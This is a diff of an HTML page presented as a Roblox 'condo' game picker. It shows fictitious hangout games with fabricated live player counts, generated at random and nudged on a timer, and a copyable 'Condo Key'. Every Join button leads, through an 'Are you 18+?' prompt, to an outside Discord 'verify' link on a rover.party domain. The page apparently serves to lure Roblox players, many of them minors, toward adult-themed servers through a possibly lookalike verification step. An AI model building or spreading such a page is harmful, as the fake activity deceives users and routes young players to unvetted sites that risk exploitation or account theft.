@@ -3,223 +3,235 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>🎀 Roblox Condo Hangouts 🎀</title>
+<title>Roblox Condo Picker</title>
 <style>
   body {
-    background: linear-gradient(135deg, #ffe1f2, #ffd6ec);
     font-family: "Poppins", sans-serif;
-    color: #5b006b;
-    margin: 0;
-    padding: 30px;
+    background-color: #ffe6f2;
+    color: #333;
     text-align: center;
-    overflow-x: hidden;
+    margin: 0;
+    padding: 0;
   }
 
   h1 {
-    color: #ff68b4;
-    font-size: 2.5em;
-    margin-bottom: 10px;
-    text-shadow: 0 0 10px #fff;
-  }
-
-  .subtitle {
-    color: #a23c7b;
-    font-size: 1.1em;
-    margin-bottom: 25px;
-  }
-
-  .player-count {
-    background: rgba(255, 255, 255, 0.8);
-    display: inline-block;
-    padding: 8px 20px;
+    background: linear-gradient(135deg, #ff9ad5, #ffc6e7);
+    color: white;
+    padding: 20px;
     border-radius: 20px;
-    color: #ff4fa2;
-    font-weight: bold;
-    margin-bottom: 30px;
-    box-shadow: 0 0 12px rgba(255, 105, 180, 0.2);
-    transition: all 0.4s ease;
+    display: inline-block;
+    margin-top: 20px;
+    cursor: pointer;
+    box-shadow: 0 4px 12px rgba(255, 182, 222, 0.6);
+    transition: 0.3s;
+  }
+
+  h1:hover {
+    transform: scale(1.05);
+    background: linear-gradient(135deg, #ffb5e3, #ffd1f2);
   }
 
   .games {
-    display: grid;
-    grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
-    gap: 25px;
-    justify-items: center;
+    display: flex;
+    justify-content: center;
+    flex-wrap: wrap;
+    margin: 30px auto;
+    max-width: 1100px;
+    gap: 20px;
   }
 
   .game {
-    background: #fff;
-    border-radius: 22px;
-    padding: 15px;
-    box-shadow: 0 5px 18px rgba(255, 105, 180, 0.25);
-    transition: transform 0.25s ease, box-shadow 0.25s ease;
-    width: 250px;
+    background: white;
+    border-radius: 20px;
+    box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+    width: 220px;
+    padding-bottom: 20px;
+    transition: 0.3s;
   }
 
   .game:hover {
-    transform: scale(1.03);
-    box-shadow: 0 6px 20px rgba(255, 105, 180, 0.3);
+    transform: translateY(-5px);
   }
 
-  .img-box {
+  .game img {
     width: 100%;
-    height: 160px;
-    border-radius: 15px;
-    overflow: hidden;
-  }
-
-  .img-box img {
-    width: 100%;
-    height: 100%;
+    height: 130px;
+    border-radius: 20px 20px 0 0;
     object-fit: cover;
   }
 
   .game h3 {
-    color: #ff5ca5;
-    margin-top: 12px;
-    margin-bottom: 5px;
+    color: #ff4fa3;
+    font-size: 18px;
+    margin: 10px 0 5px 0;
   }
 
-  .desc {
-    color: #a1457e;
-    font-size: 0.9em;
-    margin-bottom: 10px;
+  .game p {
+    color: #666;
+    font-size: 14px;
+    padding: 0 10px;
+    min-height: 35px;
+  }
+
+  .players {
+    color: #ff66b3;
+    font-weight: 600;
+    margin-bottom: 8px;
   }
 
   .join-btn {
-    background: linear-gradient(135deg, #ff9ace, #ff70b5);
+    background: #ff99cc;
     border: none;
-    border-radius: 15px;
-    padding: 10px 25px;
     color: white;
-    font-weight: bold;
-    margin-top: 10px;
+    padding: 8px 16px;
+    border-radius: 10px;
     cursor: pointer;
-    transition: background 0.3s ease, transform 0.2s ease;
+    transition: 0.2s;
   }
 
   .join-btn:hover {
-    background: linear-gradient(135deg, #ff84c3, #ff5aa7);
-    transform: translateY(-2px);
+    background: #ff66b3;
+    transform: scale(1.05);
   }
 
-  .popup {
+  #popup {
     position: fixed;
     top: 0; left: 0; right: 0; bottom: 0;
-    background: rgba(255, 182, 218, 0.8);
+    background: rgba(0,0,0,0.6);
     display: none;
-    align-items: center;
     justify-content: center;
-    z-index: 999;
+    align-items: center;
   }
 
   .popup-content {
-    background: #fff;
+    background: white;
+    padding: 25px;
     border-radius: 20px;
-    padding: 30px;
+    width: 300px;
     text-align: center;
-    box-shadow: 0 5px 15px rgba(255, 105, 180, 0.4);
-    max-width: 320px;
+    box-shadow: 0 4px 12px rgba(0,0,0,0.3);
   }
 
-  .redirecting {
-    font-size: 1.1em;
-    color: #ff6fa8;
-    font-weight: bold;
+  .popup-btn {
+    margin: 8px;
+    background: #ff99cc;
+    border: none;
+    color: white;
+    padding: 8px 16px;
+    border-radius: 10px;
+    cursor: pointer;
+    transition: 0.2s;
+  }
+
+  .popup-btn:hover {
+    background: #ff66b3;
+  }
+
+  #message {
+    background: #fff0f6;
+    color: #ff66b3;
+    font-weight: 600;
+    border-radius: 12px;
+    padding: 10px 16px;
+    position: fixed;
+    top: 20px;
+    right: 20px;
+    display: none;
   }
 </style>
 </head>
 <body>
 
-<h1>🎀 Roblox Condo Hangouts 🎀</h1>
-<p class="subtitle">Find your next cozy spot to chill and make friends 💕</p>
+<h1 id="keyTitle">🔑 Condo Key: CONZ2025</h1>
+<div id="message">✨ Key copied!</div>
 
-<div class="player-count">Online Players: <span id="playerCount">0</span></div>
+<div class="games" id="gameList"></div>
 
-<div class="games">
-  <div class="game">
-    <div class="img-box">
-      <img src="https://i.postimg.cc/d3HNb9q6/images-4.jpg" alt="Bubble Café">
-    </div>
-    <h3>Your Ai Neko☕</h3>
-    <p class="desc">Relax with friends, sip some pink milk tea, and vibe!</p>
-    <button class="join-btn" onclick="redirectToGame()">Join</button>
-  </div>
-
-  <div class="game">
-    <div class="img-box">
-      <img src="https://i.postimg.cc/wBjyvcH9/images-6.jpg" alt="Dream Plaza">
-    </div>
-    <h3>[VC] CozyPlaza🌸</h3>
-    <p class="desc">A soft hangout full of pastel vibes and friendly people.</p>
-    <button class="join-btn" onclick="redirectToGame()">Join</button>
-  </div>
-
-  <div class="game">
-    <div class="img-box">
-      <img src="https://i.postimg.cc/0jMyScXL/images-7.jpg" alt="Cozy Loft">
-    </div>
-    <h3>Cozy Loft 🧸</h3>
-    <p class="desc">Play mini games and decorate your own cute space!</p>
-    <button class="join-btn" onclick="redirectToGame()">Join</button>
-  </div>
-
-  <div class="game">
-    <div class="img-box">
-      <img src="https://i.postimg.cc/Zndymbmc/images-3.jpg" alt="Sweet Street">
-    </div>
-    <h3>Sweet Street 🍬</h3>
-    <p class="desc">Walk through candy lanes and meet awesome players!</p>
-    <button class="join-btn" onclick="redirectToGame()">Join</button>
-  </div>
-
-  <div class="game">
-    <div class="img-box">
-      <img src="https://i.postimg.cc/xCFKYpzb/images-5.jpg" alt="Pink City">
-    </div>
-    <h3>Pink City 🌷</h3>
-    <p class="desc">Your aesthetic paradise full of pink lights and smiles!</p>
-    <button class="join-btn" onclick="redirectToGame()">Join</button>
-  </div>
-</div>
-
-<div class="popup" id="popup">
-  <div class="popup-content" id="popup-content">
-    <p class="redirecting">Redirecting to verification... 💞</p>
+<div id="popup">
+  <div class="popup-content" id="popupContent">
+    <p>🌸 Are you 18+?</p>
+    <button class="popup-btn" id="yesBtn">Yes 💕</button>
+    <button class="popup-btn" id="noBtn">No 😿</button>
   </div>
 </div>
 
 <script>
-  const playerCount = document.getElementById("playerCount");
-  const popup = document.getElementById("popup");
+  // CONFIG
+  const verificationLink = "https://rover.party/verify/?guild=8232067467206849#"; // replace this link
+  
+  // GAME DATA
+  const games = [
+    { name: "Dreamy Lounge", desc: "Relax and chill with friends in a cozy dream space ☁️", img: "https://i.postimg.cc/d3HNb9q6/images-4.jpg" },
+    { name: "Blush Café", desc: "Sip coffee and chat in pastel paradise ☕💖", img: "https://i.postimg.cc/wBjyvcH9/images-6.jpg" },
+    { name: "Pink Valley", desc: "Hang out in a soft pink Roblox world 🌸", img: "https://i.postimg.cc/0jMyScXL/images-7.jpg" },
+    { name: "Star Condo", desc: "Dance under starry skies ✨", img: "https://i.postimg.cc/Zndymbmc/images-3.jpg" },
+    { name: "Bubble Hideout", desc: "Pop into a cute and calm bubble world 🫧", img: "https://i.postimg.cc/xCFKYpzb/images-5.jpg" }
+  ];
 
-  // 💗 One shared verification link
-  const verificationLink = "https://rover.party/verify?guild=8232067467206849";
+  const gameList = document.getElementById("gameList");
+  let popup = document.getElementById("popup");
 
-  let count = Math.floor(200 + Math.random() * 800);
-  let displayedCount = count;
+  // Player counts between 200–400
+  games.forEach(g => g.players = Math.floor(200 + Math.random() * 200));
 
-  function smoothUpdate() {
-    displayedCount += (count - displayedCount) * 0.1;
-    playerCount.textContent = Math.round(displayedCount);
-    requestAnimationFrame(smoothUpdate);
+  // Display games
+  function renderGames() {
+    gameList.innerHTML = games.map((g, i) => `
+      <div class="game">
+        <img src="${g.img}" alt="${g.name}">
+        <h3>${g.name}</h3>
+        <p>${g.desc}</p>
+        <div class="players">👥 ${g.players} online</div>
+        <button class="join-btn" onclick="openPopup(${i})">Join</button>
+      </div>
+    `).join("");
   }
-  smoothUpdate();
+  renderGames();
 
-  function updatePlayerCount() {
-    const change = Math.random() < 0.5 ? -10 : +5;
-    count += change;
-    if (count < 200) count = 200;
-    if (count > 999) count = 999;
-  }
-  setInterval(updatePlayerCount, 6000);
+  // Smooth player count updates
+  setInterval(() => {
+    games.forEach(g => {
+      let change = Math.random() > 0.5 ? 5 : -10;
+      g.players = Math.min(400, Math.max(200, g.players + change));
+    });
+    renderGames();
+  }, 6000);
 
-  function redirectToGame() {
+  // Popup logic
+  let selectedGame = null;
+  function openPopup(i) {
+    selectedGame = i;
     popup.style.display = "flex";
-    setTimeout(() => {
-      window.location.href = verificationLink;
-    }, 2000);
   }
+
+  document.getElementById("noBtn").onclick = () => {
+    document.getElementById("popupContent").innerHTML = "<p>😿 You're not eligible to enter this game.</p><button class='popup-btn' onclick='closePopup()'>Close</button>";
+  };
+
+  document.getElementById("yesBtn").onclick = () => {
+    window.location.href = verificationLink;
+  };
+
+  function closePopup() {
+    popup.style.display = "none";
+    document.getElementById("popupContent").innerHTML = `
+      <p>🌸 Are you 18+?</p>
+      <button class="popup-btn" id="yesBtn">Yes 💕</button>
+      <button class="popup-btn" id="noBtn">No 😿</button>
+    `;
+    document.getElementById("yesBtn").onclick = () => window.location.href = verificationLink;
+    document.getElementById("noBtn").onclick = () => {
+      document.getElementById("popupContent").innerHTML = "<p>😿 You're not eligible to enter this game.</p><button class='popup-btn' onclick='closePopup()'>Close</button>";
+    };
+  }
+
+  // Copy key on title click
+  document.getElementById("keyTitle").addEventListener("click", () => {
+    navigator.clipboard.writeText("CONZ2025");
+    const msg = document.getElementById("message");
+    msg.style.display = "block";
+    setTimeout(() => msg.style.display = "none", 2000);
+  });
 </script>
 
 </body>
